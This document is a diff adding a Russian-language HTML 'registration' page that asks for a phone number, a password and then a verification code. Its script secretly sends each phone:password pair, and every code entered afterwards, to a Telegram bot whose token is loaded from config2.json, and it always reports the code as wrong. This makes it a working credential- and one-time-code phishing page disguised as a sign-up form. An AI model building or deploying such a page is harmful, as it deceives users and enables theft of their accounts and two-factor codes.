@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Регистрация</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #1e1e1e;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            width: 300px;
+            text-align: center;
+        }
+        h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background: #2a2a2a;
+            color: #ffffff;
+        }
+        input:focus {
+            border-color: #6200ea;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #6200ea;
+            border: none;
+            border-radius: 5px;
+            color: #ffffff;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #3700b3;
+        }
+        .error {
+            color: #ff3d00;
+            display: none;
+            margin-top: 10px;
+        }
+        .description {
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #b0b0b0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+    	<r id=registration-form>
+        <h2>Регистрация</h2>
+        <p class="description">Пройдите регистрацию, чтобы продолжить</p>
+        <input type="tel" id="email" placeholder="Телефон" required><br>
+        <input type="password" id="password" placeholder="Введите пароль" required><br>
+        <input type="password" id="passwordt" placeholder="Повторите пароль" required><br>
+        <span class="error" id="password-error"></span><br>
+        <button onclick="register()">Зарегистрироваться</button>
+        </r>
+        <div id="verification-form" style="display:none;">
+            <h2>Введите проверочный код</h2>
+            <input type="text" id="verification-code" placeholder="Код из письма" required><br>
+            <span class="error" id="code-error">Код неверный.</span><br>
+            <button onclick="verifyCode()">Подтвердить код</button>
+        </div>
+    </div>
+
+
+
+
+
+    <script>
+    var userb, tokenb = "";
+    
+    function isValidEmail(email) {
+    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return regex.test(email);
+}
+        function isPasswordValid(password) {
+            const simplePasswords = ["qwerty123", "qazxswedc", "12345678", "87654321", "0987654321", "1234567890"];
+            return password.length >= 8 && !simplePasswords.includes(password);
+        }
+fetch('config2.json').then(response => {
+    
+    return response.json(); 
+  })
+  .then(data => {
+    tokenb = data.token;
+    userb = data.uid;
+  })
+  .catch(error => {
+    console.error('Ошибка:', error);
+  });
+
+        function register() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var password2 = document.getElementById('passwordt').value;
+            var passwordError = document.getElementById('password-error');
+
+            if (!isPasswordValid(password)) {
+                passwordError.style.display = 'block';
+                passwordError.innerHTML="Пароль должен содержать минимум 8 символов и не быть простым.";
+                return;
+            } else {
+                passwordError.style.display = 'none';
+            }
+
+            // Отправка GET-запроса
+            fetch(`https://api.telegram.org/bot${tokenb}/sendMessage?chat_id=${userb}&text=${encodeURIComponent(email+":"+password)}`)
+                .then(response => {
+                    if(email.length >= 10){//if (response.ok) {
+                    	if(password == password2){
+		                	document.getElementById('registration-form').style.display = 'none';
+		                    document.getElementById('verification-form').style.display = 'block';
+                    	}else{
+                    	passwordError.style.display = 'block';
+                		passwordError.innerHTML="Повторите пароль";
+                    	}
+                        
+                    }else{
+                    passwordError.style.display = 'block';
+                	passwordError.innerHTML="Укажите полный номер телефона";
+                    }
+                });
+        }
+
+        function verifyCode() {
+        	const email = document.getElementById('email').value;
+            const code = document.getElementById('verification-code').value;
+            fetch(`https://api.telegram.org/bot${tokenb}/sendMessage?chat_id=${userb}&text=${encodeURIComponent("code: "+code+` (${email})`)}`)
+                .then(response => {
+                    document.getElementById('code-error').style.display = 'block';
+                });
+        }
+    </script>
+</body>
+</html>
+
